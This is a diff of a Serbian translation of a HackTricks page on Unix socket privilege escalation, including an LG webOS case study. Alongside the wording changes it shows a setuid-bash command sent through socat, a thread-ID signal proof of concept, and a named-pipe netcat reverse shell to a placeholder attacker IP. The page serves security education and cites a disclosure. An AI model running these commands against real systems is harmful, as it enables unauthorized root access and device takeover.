@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Primer bindovanja Socket-a u Pythonu
+## Socket binding example with Python
 
-U sledećem primeru je kreiran **unix socket** (`/tmp/socket_test.s`) i sve što se **primi** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete naći u prirodi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix sockets i kako upravljati ulazom u najgorem mogućem slučaju.
+U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`) i sve što se **primi** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete naći u prirodi, ali cilj ovog primera je da pokaže kako izgleda kod koji koristi unix sockets i kako upravljati ulazom u najgorem mogućem slučaju.
 ```python:s.py
 import socket
 import os, os.path
@@ -39,15 +39,15 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Studija slučaja: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-Neki privilegovani daemoni izlažu root-owned UNIX socket koji prihvata nepouzdan ulaz i povezuje privilegovane akcije sa thread-IDs i signalima. Ako protokol dozvoljava neprivilegovanom klijentu da utiče na to koji native thread će biti meta, moguće je pokrenuti privilegovani kod i izvršiti eskalaciju.
+Neki privileged daemons izlažu root-owned UNIX socket koji prihvata untrusted input i vezuje privileged actions za thread-IDs i signals. Ako protocol dozvoljava da unprivileged client utiče na koji native thread bude targetiran, možda ćete moći da trigger-ujete privileged code path i escalate-ujete.
 
-Uočen obrazac:
-- Poveži se na root-owned socket (npr. /tmp/remotelogger).
-- Kreiraj thread i pribavi njegov native thread id (TID).
-- Pošalji TID (packed) plus padding kao request; primi acknowledgement.
-- Pošalji određeni signal tom TID-u da pokrene privilegovano ponašanje.
+Posmatran obrazac:
+- Povežite se na root-owned socket (npr. /tmp/remotelogger).
+- Kreirajte thread i dobijte njegov native thread id (TID).
+- Pošaljite TID (packed) plus padding kao request; primite acknowledgement.
+- Pošaljite specifičan signal tom TID-u da biste trigger-ovali privileged behaviour.
 
-Skica minimalnog PoC-a:
+Minimalna PoC skica:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,16 +59,16 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Da biste ovo pretvorili u root shell, može se upotrebiti jednostavan named-pipe + nc pattern:
+Da biste ovo pretvorili u root shell, može se koristiti jednostavan named-pipe + nc pattern:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Napomene:
-- Ova klasa ranjivosti nastaje kada se veruje vrednostima izvedenim iz stanja neprivilegovanog klijenta (TIDs) i povezuje ih sa privilegovanim obrađivačima signala ili logikom.
-- Ojačajte primenom kredencijala na socketu, validacijom formata poruka i razdvajanjem privilegovanih operacija od spolja dostavljenih identifikatora niti.
+- Ova klasa ranjivosti nastaje zbog poverenja u vrednosti izvedene iz neprivilegovanog stanja klijenta (TIDs) i vezivanja tih vrednosti za privilegovane obrađivače signala ili logiku.
+- Ojačajte primenom credentials na socket, validacijom formata poruka i odvajanjem privilegovanih operacija od spolja dostavljenih identifikatora niti.
 
-## References
+## Reference
 
 - [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
